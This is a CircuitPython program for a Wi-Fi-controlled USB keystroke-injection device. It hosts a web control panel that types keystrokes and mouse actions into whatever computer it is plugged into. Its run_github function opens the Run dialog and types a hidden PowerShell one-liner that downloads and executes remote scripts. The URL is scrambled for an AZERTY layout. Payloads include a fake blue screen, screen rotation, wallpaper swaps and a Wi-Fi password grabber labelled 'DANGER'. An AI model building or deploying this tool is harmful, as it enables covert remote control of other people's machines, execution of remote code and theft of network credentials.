import wifi
import socketpool
import usb_hid
import time
import random
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from adafruit_hid.mouse import Mouse
from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode
from adafruit_httpserver import Server, Request, Response

# --- CONFIGURATION RESEAU ---
SSID = "Sender"
wifi.radio.start_ap(SSID)
HOST_IP = str(wifi.radio.ipv4_address_ap)

# --- ROUTES ---
pool = socketpool.SocketPool(wifi.radio)
server = Server(pool, debug=False)

# --- CONFIGURATION CLAVIER SOURIS ---
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
mouse = Mouse(usb_hid.devices)
cc = ConsumerControl(usb_hid.devices)

# ==============================================================
# --- GITHUB ---------------------------------------------------
# URL de base du repo (converti AZERTY BE)
# correspond a : https://raw.githubusercontent.com/IziPop/script/main/
# powershell -w 1 -c "iex(irm https://raw.github.com/IziPop/script/main/[NOM].ps1)" 
# ==============================================================
GITHUB = "https.>>rqz<github<co;>IwiPop>script>;qin>"

def run_github(script_name):
    """Télécharge et exécute un script depuis GitHub en mémoire"""
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.6)
    url = GITHUB + script_name + "<ps!"
    layout.write("pozershell =z ! =c 3iex5ir; " + url + "-3")
    kbd.press(Keycode.ENTER)
    kbd.release_all()

# ==============================================================

# --- DECODAGE URL COMPLET ---
def url_decode(s):
    result = ""
    i = 0
    while i < len(s):
        if s[i] == '%' and i + 2 < len(s):
            result += chr(int(s[i+1:i+3], 16))
            i += 3
        elif s[i] == '+':
            result += ' '
            i += 1
        else:
            result += s[i]
            i += 1
    return result

# --- TOUCHES SPECIALES ---
SPECIAL_KEYS = {
    "WIN": Keycode.WINDOWS,
    "ENTER": Keycode.ENTER,
    "ESC": Keycode.ESCAPE,
    "TAB": Keycode.TAB,
    "SPACE": Keycode.SPACE,
    "BACKSPACE": Keycode.BACKSPACE,
    "DELETE": Keycode.DELETE,
    "UP": Keycode.UP_ARROW,
    "DOWN": Keycode.DOWN_ARROW,
    "LEFT": Keycode.LEFT_ARROW,
    "RIGHT": Keycode.RIGHT_ARROW,
    "CTRL": Keycode.CONTROL,
    "ALT": Keycode.ALT,
    "SHIFT": Keycode.SHIFT,
    "F4": Keycode.F4,
}

def execute_message(message):
    i = 0
    while i < len(message):
        if message[i] == '[':
            end = message.find(']', i)
            if end != -1:
                combo = message[i+1:end]
                keys = combo.split('+')
                keycodes = []
                for k in keys:
                    k = k.strip().upper()
                    if k in SPECIAL_KEYS:
                        keycodes.append(SPECIAL_KEYS[k])
                    elif len(k) == 1:
                        keycodes.append(getattr(Keycode, k, None))
                keycodes = [k for k in keycodes if k is not None]
                if keycodes:
                    kbd.press(*keycodes)
                    time.sleep(0.05)
                    kbd.release_all()
                i = end + 1
            else:
                layout.write(message[i])
                i += 1
        else:
            layout.write(message[i])
            i += 1

# --- PAGE WEB ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #121212; color: #00ff00; font-family: sans-serif; text-align: center; padding: 20px; }
        input[type="text"] { width: 80%; padding: 15px; border-radius: 5px; border: 1px solid #00ff00; background: #000; color: #00ff00; font-size: 18px; margin-bottom: 20px; }
        input[type="submit"] { background: #00ff00; color: #000; padding: 15px 30px; border: none; border-radius: 5px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 5px; }
        .shortcuts { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 20px; }
        .shortcut { background: #1a1a1a; border: 1px solid #00ff00; padding: 10px 15px; border-radius: 5px; cursor: pointer; color: #00ff00; text-decoration: none; }
        .category { width: 100%; text-align: left; margin-top: 20px; border-bottom: 1px solid #00ff00; padding-bottom: 5px; }
        select { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; border-radius: 5px; font-size: 16px; }
        label { color: #00ff00; font-size: 16px; }
    </style>
</head>
<body>
    <h1>💀 TERMINAL 💀</h1>

    <p>👥 Connectés : <span id="clients">...</span></p>
    <script>
    setInterval(function() {
        fetch('/clients').then(r => r.text()).then(n => {
            document.getElementById('clients').innerText = n;
        });
    }, 3000);
    </script>

    <p style="font-size:13px;">
    Touches : [WIN] [ENTER] [ESC] [TAB] [SPACE] [BACKSPACE] [DELETE] [UP] [DOWN] [LEFT] [RIGHT]<br>
    Combinaisons : [WIN+R] [CTRL+C] [ALT+F4] [CTRL+SHIFT+ESC]
    </p>

    <form action="/type">
        <input type="text" name="message" placeholder="Écrivez ici..." autofocus autocomplete="off">
        <br>
        <label><input type="checkbox" name="enter" value="1"> Appuyer Entrée après</label>
        <br><br>
        <input type="submit" value="INJECTER">
    </form>

    <div class="shortcuts">

        <div class="category">⌨️ KEYBOARD & MOUSE</div>
        <a class="shortcut" href="/shortcut?action=winr">🔑 Win+R</a>
        <a class="shortcut" href="/shortcut?action=taskmanager">📊 Task Manager</a>
        <a class="shortcut" href="/shortcut?action=lock">🔒 Lock PC</a>
        <a class="shortcut" href="/shortcut?action=explorer">📁 Explorateur</a>
        <a class="shortcut" href="/shortcut?action=desktop">🖥️ Bureau</a>
        <a class="shortcut" href="/shortcut?action=altf4">❌ Fermer fenêtre</a>
        <a class="shortcut" href="/shortcut?action=taskvue">🪟 Task View</a>
        <a class="shortcut" href="/shortcut?action=disco" style="border-color: #ff00ff; color: #ff00ff;">🌈 Disco Brightness</a>
        <a class="shortcut" href="/shortcut?action=caps">🔠 Caps Toggle</a>
        <a class="shortcut" href="/shortcut?action=mouse">🐁 Souris</a>
        <a class="shortcut" href="/shortcut?action=left_click">🖱️ Clic Gauche</a>
        <a class="shortcut" href="/shortcut?action=right_click">🖱️ Clic Droit</a>
        <a class="shortcut" href="/shortcut?action=snapleft">⬅️ Snap gauche</a>
        <a class="shortcut" href="/shortcut?action=snapright">➡️ Snap droite</a>
        <a class="shortcut" href="/shortcut?action=vol_max" style="color: #ff00ff; border-color: #ff00ff;">🔊 Volume 100%</a>
        <a class="shortcut" href="/shortcut?action=vol_zero" style="color: #ff00ff; border-color: #ff00ff;">🔇 Volume 0%</a>

        <div class="category">⚡ SCRIPTS WIN+R</div>
        <!-- Pour ajouter un script : 1. Ajoute le .ps1 sur GitHub  2. Ajoute un elif dans /shortcut  3. Ajoute un bouton ici -->
        <a class="shortcut" href="/shortcut?action=bsod">🟦 Blue Screen</a>
        <a class="shortcut" href="/shortcut?action=rotate">🔄 Rotate 180°</a>
        <a class="shortcut" href="/shortcut?action=unrotate">↩️ Unrotate</a>

        <select id="wallpaperSelect">
            <option value="">-- Choisir Fond --</option>
            <option value="bqse">Reset (Windiows wallpaper)</option>
            <option value="bqsetroll">Reset?</option>
            <option value="louis">Louis</option>
            <option value="cs;">Chainsaw Man</option>
        </select>
        <a class="shortcut" onclick="setWallpaper()" style="cursor:pointer;">🖼️ Fond d'écran</a>
        <script>
        function setWallpaper() {
            var img = document.getElementById('wallpaperSelect').value;
            if (!img) { alert('Choisis une image !'); return; }
            fetch('/shortcut?action=wallpaper&file=' + img);
        }
        </script>

        <div class="category">⚠️ DANGER</div>
        <a class="shortcut" href="/shortcut?action=wifi">📶 WiFi Password</a>

    </div>
</body>
</html>
"""

@server.route("/")
def base(request: Request):
    return Response(request, HTML_PAGE, content_type="text/html")

@server.route("/clients")
def clients(request: Request):
    try:
        nb = len(wifi.radio.stations_ap)
    except:
        nb = 0
    return Response(request, str(nb), content_type="text/plain")

@server.route("/type")
def type_on_pc(request: Request):
    message = url_decode(request.query_params.get("message", ""))
    enter = request.query_params.get("enter", "0")
    if message:
        execute_message(message)
        if enter == "1":
            kbd.press(Keycode.ENTER)
            kbd.release_all()
        return Response(request, "OK", content_type="text/plain")
    return Response(request, "ERREUR", content_type="text/plain")

@server.route("/shortcut")
def shortcut(request: Request):
    action = request.query_params.get("action", "")

    # --- SHORTCUTS CLAVIER ---
    if action == "winr":
        kbd.press(Keycode.WINDOWS, Keycode.R)
        kbd.release_all()
    elif action == "taskmanager":
        kbd.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ESCAPE)
        kbd.release_all()
    elif action == "lock":
        kbd.press(Keycode.WINDOWS, Keycode.L)
        kbd.release_all()
    elif action == "explorer":
        kbd.press(Keycode.WINDOWS, Keycode.E)
        kbd.release_all()
    elif action == "desktop":
        kbd.press(Keycode.WINDOWS, Keycode.D)
        kbd.release_all()
    elif action == "altf4":
        kbd.press(Keycode.ALT, Keycode.F4)
        kbd.release_all()
    elif action == "taskvue":
        kbd.press(Keycode.WINDOWS, Keycode.TAB)
        kbd.release_all()
    elif action == "snapleft":
        kbd.press(Keycode.WINDOWS, Keycode.LEFT_ARROW)
        kbd.release_all()
    elif action == "snapright":
        kbd.press(Keycode.WINDOWS, Keycode.RIGHT_ARROW)
        kbd.release_all()
    elif action == "mouse":
        dist_x = random.randint(15, 40) * random.choice([-1, 1])
        dist_y = random.randint(15, 40) * random.choice([-1, 1])
        mouse.move(x=dist_x, y=dist_y)
    elif action == "left_click":
        mouse.click(Mouse.LEFT_BUTTON) 
    elif action == "right_click":
        mouse.click(Mouse.RIGHT_BUTTON)
    elif action == "vol_max":
        for _ in range(50):
            cc.send(ConsumerControlCode.VOLUME_INCREMENT)
            time.sleep(0.01)
    elif action == "vol_zero":
        for _ in range(50):
            cc.send(ConsumerControlCode.VOLUME_DECREMENT)
            time.sleep(0.01)
    elif action == "disco":
        for _ in range(10):
            cc.send(ConsumerControlCode.BRIGHTNESS_INCREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_INCREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_INCREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_INCREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_INCREMENT)
            time.sleep(0.05)
            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
            cc.send(ConsumerControlCode.BRIGHTNESS_DECREMENT)
            time.sleep(0.05)
    elif action == "caps":
        kbd.send(Keycode.CAPS_LOCK)
    # --- SCRIPTS GITHUB ---
    # Pour ajouter un script :
    # 1. Crée le .ps1 sur le GitHub
    # 2. Ajoute un elif ici avec run_github("nom_azerty")
    # 3. Ajoute un bouton dans le HTML
    elif action == "bsod":
        run_github("bsod")
    elif action == "rotate":
        run_github("screen!")
    elif action == "unrotate":
        run_github("screen@")
    elif action == "wifi":
        run_github("zifi")

    # --- WALLPAPER ---
    # Un ps1 par fond sur GitHub : wallpaper-[nom].ps1, etc.
    elif action == "wallpaper":
        file = request.query_params.get("file", "")
        if file:
            run_github("zqllpqper=" + file)

    return Response(request, "OK", content_type="text/plain")

# --- LANCEMENT ---
print(f"Pret ! Connecte-toi au WiFi '{SSID}' puis va sur http://{HOST_IP}")
server.serve_forever(HOST_IP)
